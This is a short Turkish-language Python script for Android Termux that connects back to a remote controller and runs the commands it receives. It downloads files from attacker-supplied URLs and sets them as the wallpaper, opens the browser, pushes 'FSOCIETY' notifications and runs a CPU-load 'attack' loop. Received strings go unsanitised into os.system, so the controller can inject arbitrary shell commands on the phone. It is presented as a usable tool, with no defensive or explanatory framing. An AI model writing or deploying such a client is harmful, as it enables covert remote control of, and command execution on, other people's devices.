
import socket
import os
import time

modem_ip = input("Modem IP gir: ")
port = int(input("Port gir: "))

try:
    s = socket.socket()
    s.connect((modem_ip, port))
    print("[✓] Sunucuya baglanildi.")
except:
    print("[!] Baglanti hatasi.")
    exit()

while True:
    try:
        komut = s.recv(1024).decode().strip()

        if komut.startswith("arkaplan "):
            url = komut.split(" ", 1)[1]
            os.system(f"termux-wget -O arka.jpg {url}")
            os.system("termux-wallpaper -f arka.jpg")
            s.send("[✓] Arka plan degisti\n".encode())

        elif komut == "google":
            os.system("am start -a android.intent.action.VIEW -d 'https://www.google.com'")
            s.send("[✓] Google acildi\n".encode())

        elif komut.startswith("uyari "):
            mesaj = komut.split(" ", 1)[1]
            os.system(f'termux-notification --title "FSOCIETY" --content "{mesaj}"')
            s.send("[✓] Uyari gonderildi\n".encode())

        elif komut == "saldiri":
            for _ in range(5000000):
                pass  # CPU yükü oluşturur
            s.send("[✓] Saldiri tamamlandi\n".encode())

        else:
            s.send("[!] Bilinmeyen komut\n".encode())

    except:
        break

s.close()
